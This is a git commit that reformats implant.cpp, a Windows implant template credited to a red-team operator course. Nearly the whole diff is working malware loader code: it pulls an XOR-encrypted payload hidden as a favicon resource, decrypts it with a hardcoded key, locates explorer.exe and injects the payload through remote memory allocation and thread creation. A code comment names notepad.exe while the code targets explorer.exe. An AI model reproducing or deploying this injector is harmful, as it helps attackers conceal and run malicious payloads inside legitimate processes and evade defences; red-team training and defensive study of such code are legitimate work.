11f0ded78db2aaa6c5284fc25c9cf0509c07b8a6
James Fraser <wulfgar.pro@gmail.com>
2023-11-07 16:50:37 +1100

    Format C code

--- implant.cpp
+++ implant.cpp
@@ -2,7 +2,7 @@
 
  Red Team Operator course code template
  storing payload in .rsrc section
- 
+
  author: reenz0h (twitter: @sektor7net)
 
 */
@@ -14,36 +14,44 @@
 
 #include "resource.h"
 
-void XOR(char* data, size_t data_len, char* key, size_t key_len) {
+void XOR(char *data, size_t data_len, char *key, size_t key_len)
+{
     int j;
 
     j = 0;
-    for (int i = 0; i < data_len; i++) {
-        if (j == key_len - 1) j = 0;
+    for (int i = 0; i < data_len; i++)
+    {
+        if (j == key_len - 1)
+            j = 0;
 
         data[i] = data[i] ^ key[j];
         j++;
     }
 }
 
-int FindTarget(const char* procname) {
+int FindTarget(const char *procname)
+{
 
     HANDLE hProcSnap;
     PROCESSENTRY32 pe32;
     int pid = 0;
 
     hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
+    if (INVALID_HANDLE_VALUE == hProcSnap)
+        return 0;
 
     pe32.dwSize = sizeof(PROCESSENTRY32);
 
-    if (!Process32First(hProcSnap, &pe32)) {
+    if (!Process32First(hProcSnap, &pe32))
+    {
         CloseHandle(hProcSnap);
         return 0;
     }
 
-    while (Process32Next(hProcSnap, &pe32)) {
-        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
+    while (Process32Next(hProcSnap, &pe32))
+    {
+        if (lstrcmpiA(procname, pe32.szExeFile) == 0)
+        {
             pid = pe32.th32ProcessID;
             break;
         }
@@ -54,16 +62,18 @@ int FindTarget(const char* procname) {
     return pid;
 }
 
-int Inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {
+int Inject(HANDLE hProc, unsigned char *payload, unsigned int payload_len)
+{
 
     LPVOID pRemoteCode = NULL;
     HANDLE hThread = NULL;
 
     pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
-    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);
+    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
 
     hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
-    if (hThread != NULL) {
+    if (hThread != NULL)
+    {
         WaitForSingleObject(hThread, 500);
         CloseHandle(hThread);
         return 0;
@@ -72,8 +82,9 @@ int Inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
-    LPSTR lpCmdLine, int nCmdShow) {
-    void * exec_mem;
+                   LPSTR lpCmdLine, int nCmdShow)
+{
+    void *exec_mem;
     BOOL rv;
     HANDLE th;
     DWORD oldProtect = 0;
@@ -81,43 +92,45 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     HRSRC res;
     int pid = 0;
     HANDLE hProc = NULL;
-    
-    unsigned char* payload;
+
+    unsigned char *payload;
     unsigned int payload_len;
     char key[] = "mysecretkeee";
 
     // Extract payload from resources section
     res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
     resHandle = LoadResource(NULL, res);
-    payload = (unsigned char*) LockResource(resHandle);
+    payload = (unsigned char *)LockResource(resHandle);
     payload_len = SizeofResource(NULL, res);
-    
+
     // Allocate some memory buffer for payload
     exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    //printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
-    //printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
+    // printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
+    // printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
 
     // Copy payload to new memory buffer
     RtlMoveMemory(exec_mem, payload, payload_len);
 
     // Decrypt (DeXOR) the payload
-    XOR((char*)exec_mem, payload_len, key, sizeof(key));
+    XOR((char *)exec_mem, payload_len, key, sizeof(key));
 
-    //printf("\nHit me!\n");
-    //getchar();
+    // printf("\nHit me!\n");
+    // getchar();
 
     // Inject payload into `notepad.exe` process.
     pid = FindTarget("explorer.exe");
 
-    if (pid) {
-        //printf("explorer.exe PID = %d\n", pid);
+    if (pid)
+    {
+        // printf("explorer.exe PID = %d\n", pid);
 
         // Try to open target process
         hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
-            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
-            FALSE, (DWORD)pid);
+                                PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
+                            FALSE, (DWORD)pid);
 
-        if (hProc != NULL) {
+        if (hProc != NULL)
+        {
             Inject(hProc, exec_mem, payload_len);
             CloseHandle(hProc);
         }
